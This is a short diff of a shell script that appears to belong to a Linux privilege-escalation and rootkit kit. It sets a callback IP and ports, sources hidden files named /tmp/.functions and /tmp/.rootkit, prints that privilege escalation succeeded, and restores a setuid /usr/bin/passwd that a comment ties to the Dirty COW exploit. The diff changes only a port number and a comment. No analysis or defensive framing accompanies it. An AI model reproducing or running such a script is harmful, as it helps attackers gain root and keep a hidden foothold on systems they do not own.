@@ -2,7 +2,7 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15952"
+portp="15162"
 
 source /tmp/.functions
 source /tmp/.rootkit
@@ -22,7 +22,7 @@ fi
 #---if the user making the connection is root---
 echo "priviledge escalation succeeded"
 
-#restore /usr/bin/passwd
+#restore /usr/bin/passwd (dirtycow exploit)
 mv /tmp/bak /usr/bin/passwd &>/dev/null
 chown root:root /usr/bin/passwd &>/dev/null
 chmod u+s /usr/bin/passwd &>/dev/null
